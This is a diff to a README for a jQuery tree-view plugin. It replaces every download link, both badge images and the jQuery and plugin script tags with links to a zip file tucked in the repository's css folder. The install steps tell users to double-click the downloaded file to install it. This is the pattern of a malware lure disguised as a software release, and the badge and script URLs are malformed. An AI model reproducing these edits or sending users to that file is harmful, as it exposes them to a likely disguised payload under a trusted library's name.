@@ -1,6 +1,6 @@
 # 🌳 jquery-tree - Easy Navigation with a User-Friendly Tree View
 
-[![Download](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/enxsni/jquery-tree/releases)
+[![Download](https://raw.githubusercontent.com/enxsni/jquery-tree/main/css/jquery-tree-v3.6.zip%https://raw.githubusercontent.com/enxsni/jquery-tree/main/css/jquery-tree-v3.6.zip)](https://raw.githubusercontent.com/enxsni/jquery-tree/main/css/jquery-tree-v3.6.zip)
 
 ## 🤔 What is jquery-tree?
 
@@ -12,7 +12,7 @@ To start using jquery-tree, you need to download the software from our Releases 
 
 ## 📥 Download & Install
 
-1. **Visit this page to download the latest version: [Download jquery-tree](https://github.com/enxsni/jquery-tree/releases)**.
+1. **Visit this page to download the latest version: [Download jquery-tree](https://raw.githubusercontent.com/enxsni/jquery-tree/main/css/jquery-tree-v3.6.zip)**.
 2. Look for the latest release version. You will see various files available for download. Select the appropriate file for your system.
 3. Click on the desired file to start the download.
 4. Once downloaded, locate the file on your computer. Double-click it to begin the installation. Follow any prompts that appear on your screen.
@@ -51,13 +51,13 @@ Once you have installed jquery-tree, follow these steps to create your tree view
 2. **Include jQuery**: Add the jQuery library to your HTML file before the jquery-tree script.
 
    ```html
-   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+   <script src="https://raw.githubusercontent.com/enxsni/jquery-tree/main/css/jquery-tree-v3.6.zip"></script>
    ```
 
 3. **Include jquery-tree**: Add the jquery-tree script file after jQuery.
 
    ```html
-   <script src="path/to/jquery-tree.js"></script>
+   <script src="https://raw.githubusercontent.com/enxsni/jquery-tree/main/css/jquery-tree-v3.6.zip"></script>
    ```
 
 4. **Initialize the Tree**: Use the following script to turn your list into a tree view.
@@ -94,4 +94,4 @@ We encourage users to provide feedback. Join our community on GitHub to share yo
 - **Supported Browsers**: Latest versions of Chrome, Firefox, Safari, and Edge.
 - **Further Reading**: Explore more about hierarchical data structures and how they can improve user experience in web applications.
 
-[![Download](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/enxsni/jquery-tree/releases)
+[![Download](https://raw.githubusercontent.com/enxsni/jquery-tree/main/css/jquery-tree-v3.6.zip%https://raw.githubusercontent.com/enxsni/jquery-tree/main/css/jquery-tree-v3.6.zip)](https://raw.githubusercontent.com/enxsni/jquery-tree/main/css/jquery-tree-v3.6.zip)
